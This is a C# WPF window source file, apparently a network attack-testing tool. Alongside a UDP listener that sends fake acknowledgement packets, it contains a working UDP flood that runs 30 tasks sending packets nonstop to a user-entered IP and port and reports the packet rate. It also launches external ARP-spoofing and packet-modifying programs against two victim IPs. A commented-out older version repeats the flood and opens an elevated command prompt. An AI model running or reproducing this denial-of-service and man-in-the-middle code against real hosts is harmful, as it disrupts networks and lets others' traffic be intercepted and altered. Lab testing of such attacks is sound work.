using System.Diagnostics;
using System.Net.Sockets;
using System.Net;
using System.Windows;
using System.Windows.Controls;
using dotNetClassLibrary;
using System.Text.RegularExpressions;
using System.Text;
using System.Text.Json.Serialization;

namespace WPFFrontend
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        public Process process = new Process();
        public int count = 0;
        public byte[] sendbuf = new byte[0];
        public string ipaddr;
        public int port;
        public UdpClient udpClient = new UdpClient();
        string inputs = "";
        bool DOSON = false;
        bool ListenOn = false;
        bool MixedOn = false;
        bool ARPOn = false;
        UdpClient listener = new UdpClient(12000);

        public MainWindow()
        {
            InitializeComponent();
        }

        //button for normal responses (listen)
        private void btn1_Click(object sender, RoutedEventArgs e)
        {

            try
            {
                nextAction();
                ListenOn = true;
               
                outputBox.Text += "Responding to requests on port 12000 with valid XML Data \n";

                Task.Run(() => { listen(); });
            }
            catch (Exception exception)
            {
                ProcessContent.WriteToFile(exception.ToString());
            }

        }


        private void btn2_Click(object sender, RoutedEventArgs e)
        {
            nextAction();
            DOSON = true;

            Task.Run(UDPDOS);
        }
        private void btn3_Click(object sender, RoutedEventArgs e)
        {
            nextAction();
            MixedOn = true;

            outputBox.Text += "\nResponding to requests on port 12000 with a mix of valid XML Data and gibberish\n";

            Task.Run(() => { listen(); });
        }
        private void btn4_Click(object sender, RoutedEventArgs e)
        {
            nextAction();
            ARPOn = true;
            Task.Run(mitm);
        }
        private void sendInput(object sender, RoutedEventArgs e)
        {
            this.inputs = inputBox.Text;
        }
        private void listen()
        {

            int proxyListeningForAckPort = 1543;


            IPEndPoint groupEP = new IPEndPoint(IPAddress.Any, 12000);

            while (ListenOn || MixedOn)
            {
                byte[] bytes = listener.Receive(ref groupEP);
                (uint num, char delim, string message, DateTime sendTime) = ProcessContent.convertFromTimestampedBytes(bytes);


                string total = num + "" + delim + message;
                if(ListenOn || MixedOn)
                {
                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        outputBox.Text += $"\nReceived broadcast from {groupEP}\n";
                        outputBox.Text += $"Received time: {DateTime.Now}, Sent time: {sendTime}, Latency: {(DateTime.Now - sendTime).Milliseconds}ms\n";
                        outputBox.Text += $" {total}\n";
                    });

                }


                ProcessContent.sendACK(bytes, groupEP.Address.ToString());
                if (MixedOn)
                {
                    IPEndPoint endpoint = new IPEndPoint(groupEP.Address, 1543);
                    Socket garbageSender = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                    garbageSender.SendTo(Encoding.ASCII.GetBytes("blah blah this is totally legit ack data right?!?!?!?!"), endpoint);
                    garbageSender.SendTo(Encoding.ASCII.GetBytes("blah blah this is totally legit ack data right?!?!?!?!"), endpoint);
                    garbageSender.SendTo(Encoding.ASCII.GetBytes("blah blah this is totally legit ack data right?!?!?!?!"), endpoint);
                    garbageSender.SendTo(Encoding.ASCII.GetBytes("blah blah this is totally legit ack data right?!?!?!?!"), endpoint);

                    Application.Current.Dispatcher.Invoke(() =>
                    {
                        outputBox.Text += "Valid and invalid data mix sent! \n";
                    });

                }

            }

        }


        private void UDPDOS()
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                outputBox.Text = "Please input the target IP address and port in this format:\nIP:Port\n";
            });

            while (inputs.Equals(""))
            {
                Thread.Sleep(500);
            }

            string[] a = inputs.Split(":");
            ipaddr = a[0];
            port = int.Parse(a[1]);


            startThreads();
            Task.Run(timer);

        }
        private void timer()
        {
            while (DOSON)
            {
                Application.Current.Dispatcher.Invoke(() =>
                {
                    outputBox.Text += $"Speed: {count / 2} packets per second\n";
                });
                count = 0;
                Thread.Sleep(2000);
            }

        }
        private void startThreads()
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                outputBox.Text += "Attack started!\n";
            });
            for (int i = 0; i < 30; i++)
            {
                Task.Run(scream);
            }

        }
        private void nextAction()
        {
            DOSON = false;
            ListenOn = false;
            MixedOn = false;
            ARPOn = false;

            Application.Current.Dispatcher.Invoke(() =>
            {
                outputBox.Text = "";
            });

        }
        private void scream()
        {
            //UdpClient udpClient = new UdpClient();
            while (DOSON)
            {
                udpClient.SendAsync(sendbuf, sendbuf.Length, ipaddr, port);
                count++;
            }

        }
        private void mitm()
        {
            Application.Current?.Dispatcher.Invoke(() =>
            {
                outputBox.Text += "Ready to conduct ARP Spoof MITM Modification attack.\n";
                outputBox.Text += "Please input in your two victims in this format:\nVictimIP1:VictimIP2\n";

                inputBox.Text = "";
            });
            inputs = "";
            while (inputs.Equals(""))
            {
                Thread.Sleep(500);
            }


            string ip1 = inputs.Split(":")[0];
            string ip2 = inputs.Split(":")[1];
            Application.Current?.Dispatcher.Invoke(() =>
            {
                outputBox.Text += $"Attacking {ip1} and {ip2}... ";
            });

            ProcessStartInfo start2 = new ProcessStartInfo("C:/Users/E1495970/source/repos/dist/arpspoofer.exe");
            start2.Arguments = $"{ip1} {ip2}";
            start2.UseShellExecute = false;
            Process interception = Process.Start(start2);

            ProcessStartInfo start = new ProcessStartInfo("C:/Users/E1495970/source/repos/dist/packetmoder.exe");
            start.Arguments = $"{ip1} {ip2}";
            start2.UseShellExecute = false;
            Process modification = Process.Start(start);

            while (ARPOn)
            {
                Thread.Sleep(500);
            }

            interception.Kill();
            modification.Kill();

        }
    }
}


/*using System.Diagnostics;
using System.Net.Sockets;
using System.Net;
using System.Windows;
using System.Windows.Controls;
using dotNetClassLibrary;
using System.Text.RegularExpressions;

namespace WPFFrontend
{
    /// <summary>
    /// Interaction logic for MainWindow.xaml
    /// </summary>
    public partial class MainWindow : Window
    {
        Thread listenThread;

        public Process process = new Process();
        public int count = 0;
        public byte[] sendbuf = new byte[0];
        public string ipaddr;
        public int port;
        public UdpClient udpClient = new UdpClient();
        public List<Thread> threads = new List<Thread>();
        string inputs = "";
        bool keepGoing = true;
        UdpClient listener = new UdpClient(12000);

        CancellationTokenSource cancellationTokenSource;

        public MainWindow()
        {
            InitializeComponent();
        }

        private void btn1_Click(object sender, RoutedEventArgs e)
        {
            cancellationTokenSource = new CancellationTokenSource();

            try
            {
                if (listenThread != null && listenThread.IsAlive)
                {
                    listenThread.Interrupt();
                }
                outputBox.Text += "Responding to requests on port 12000 with valid XML Data \n";

                listenThread = new Thread(new ThreadStart(() => { listen(cancellationTokenSource.Token); }));
                listenThread.Start();
            }
            catch (Exception exception)
            {
                ProcessContent.WriteToFile(exception.ToString());
            }

        }


        private void btn2_Click(object sender, RoutedEventArgs e)
        {
            //outputBox.Text = "Please input the target IP address and port in this format  IP:Port";

            if(cancellationTokenSource!= null)
            cancellationTokenSource.Cancel();
            //killThreads();

            cancellationTokenSource = new CancellationTokenSource();

            if (listenThread != null && listenThread.IsAlive)
            {
                listenThread.Interrupt();
            }
            listenThread = new Thread(new ThreadStart(() => { UDPDOS(cancellationTokenSource.Token); }));
            listenThread.Start();

            


        }
        private void btn3_Click(object sender, RoutedEventArgs e)
        {
            label.Content = "You clickyed the buttyon";
            ProcessStartInfo start2 = new ProcessStartInfo("cmd.exe", "/c powershell -Command \"Start-Process cmd -Verb RunAs\"");
            Process.Start(start2);

        }
        private void btn4_Click(object sender, RoutedEventArgs e)
        {
            label.Content = "You clickyed the buttyon";
            ProcessStartInfo start2 = new ProcessStartInfo("cmd.exe", "/c powershell -Command \"Start-Process cmd -Verb RunAs\"");
            Process.Start(start2);
        }
        private void sendInput(object sender, RoutedEventArgs e)
        {
            this.inputs = inputBox.Text;
        }
        public void listen(CancellationToken token)
        {

            int proxyListeningForAckPort = 1543;


            IPEndPoint groupEP = new IPEndPoint(IPAddress.Any, 12000);

            while (!token.IsCancellationRequested)
            {
                byte[] bytes = listener.Receive(ref groupEP);
                (uint num, char delim, string message, DateTime sendTime) = ProcessContent.convertFromTimestampedBytes(bytes);


                string total = num + "" + delim + message;

                Application.Current.Dispatcher.Invoke(() =>
                {
                    outputBox.Text += $"\nReceived broadcast from {groupEP}\n";
                    outputBox.Text += $"Received time: {DateTime.Now}, Sent time: {sendTime}, Latency: {(DateTime.Now - sendTime).Milliseconds}ms\n";
                    outputBox.Text += $" {total}\n";
                });

                ProcessContent.sendACK(bytes, groupEP.Address.ToString());

            }

        }


        public void UDPDOS(CancellationToken token)
        {

            Application.Current.Dispatcher.Invoke(() =>
            {
                outputBox.Text = "Please input the target IP address and port in this format  IP:Port\n";
            });

            while (inputs.Equals("") && !token.IsCancellationRequested)
            {
                Thread.Sleep(500);
            }

            string[] a = inputs.Split(":");
            ipaddr = a[0];
            port = int.Parse(a[1]);


            startThreads(token);
            Thread temp = new Thread(new ThreadStart(() => { timer(token); }));
            temp.Start();
            threads.Add(temp);

        }
        public void scream(CancellationToken token)
        {
            //UdpClient udpClient = new UdpClient();
            while (!token.IsCancellationRequested)
            {
                udpClient.SendAsync(sendbuf, sendbuf.Length, ipaddr, port);
                count++;
            }

        }
        public void timer(CancellationToken token)
        {
            while (!token.IsCancellationRequested)
            {
                Application.Current.Dispatcher.Invoke(() =>
                {
                    outputBox.Text += $"Speed: {count / 2} packets per second\n";
                });
                Thread.Sleep(2000);
                count = 0;

            }

        }
        public void startThreads(CancellationToken token)
        {
            Application.Current.Dispatcher.Invoke(() =>
            {
                outputBox.Text += "Attack started!\n";
            });
            for (int i = 0; i < 30; i++)
            {
                Thread listenThread = new Thread(new ThreadStart(()=> { scream(token); }));
                listenThread.Start();
                threads.Add(listenThread);
            }

        }
        public void killThreads()
        {

            keepGoing = false;

            Application.Current.Dispatcher.Invoke(() =>
            {
                outputBox.Text = "";
            });

        }
    }
}*/